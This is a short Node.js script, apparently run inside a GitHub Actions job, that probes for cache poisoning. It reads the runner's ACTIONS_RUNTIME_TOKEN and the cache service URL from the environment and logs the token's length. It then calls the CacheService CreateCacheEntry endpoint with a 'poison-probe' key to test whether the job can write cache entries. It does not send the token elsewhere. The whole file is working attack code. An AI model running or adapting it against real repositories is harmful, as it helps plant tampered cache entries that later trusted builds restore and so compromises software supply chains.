const https = require('https');
function post(url, token, body) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const data = JSON.stringify(body);
    const req = https.request({
      hostname: u.hostname, path: u.pathname + u.search, method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    }, (res) => {
      let b = '';
      res.on('data', c => b += c);
      res.on('end', () => resolve({ code: res.statusCode, body: b }));
    });
    req.on('error', e => resolve({ code: -1, body: String(e) }));
    req.write(data); req.end();
  });
}
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
  const base = process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_CACHE_URL || '';
  console.log('MODE=' + (process.env.ACTIONS_CACHE_MODE || 'unset'));
  console.log('BASE=' + base);
  console.log('TOKEN_LEN=' + token.length);
  if (!base) { console.log('NO_BASE'); return; }
  const svc = 'github.actions.results.api.v1.CacheService';
  const url = base.replace(/\/?$/, '/') + 'twirp/' + svc + '/CreateCacheEntry';
  const r = await post(url, token, { key: 'poison-probe', version: 'probe-v1' });
  console.log('CREATE_CODE=' + r.code);
  console.log('CREATE_BODY=' + r.body);
})().catch(e => { console.log('ERR=' + e); process.exit(1); });
